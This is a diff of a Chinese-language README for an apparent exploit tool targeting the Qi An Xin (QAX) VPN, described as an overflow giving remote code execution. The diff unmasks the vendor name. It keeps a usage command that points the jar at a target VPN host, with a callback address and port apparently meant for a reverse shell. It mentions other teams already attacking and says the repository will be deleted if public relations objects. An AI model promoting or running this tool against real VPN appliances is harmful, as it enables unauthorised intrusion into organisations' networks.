@@ -1,5 +1,5 @@
-# q*xin-vpn-pwn
-某信vpn pwn溢出
+# qianxin-vpn-pwn
+奇安信 qax vpn pwn溢出 rce
 
 已经看到有别的队伍在打了，预告一波，晚点放
 
@@ -28,9 +28,7 @@ java -jar QaxVpnPwn.jar -t vpn.xxx.com -p 443 -re_t x.x.x.x -re_p xxx
 
 ### 说明
 
-1、同目录的这些dll一个都不要少（可能部分dll多余了，但是调试的时候太乱了就全放进来了），不然可能打不成功。
-
-2、pwn类型的洞没办法跟之前一样贴http数据包，想深入研究的可以自己逆向～
+1、pwn类型的洞没办法跟之前一样贴http数据包，想深入研究的可以自己逆向～
 
 3、公关就删！
 
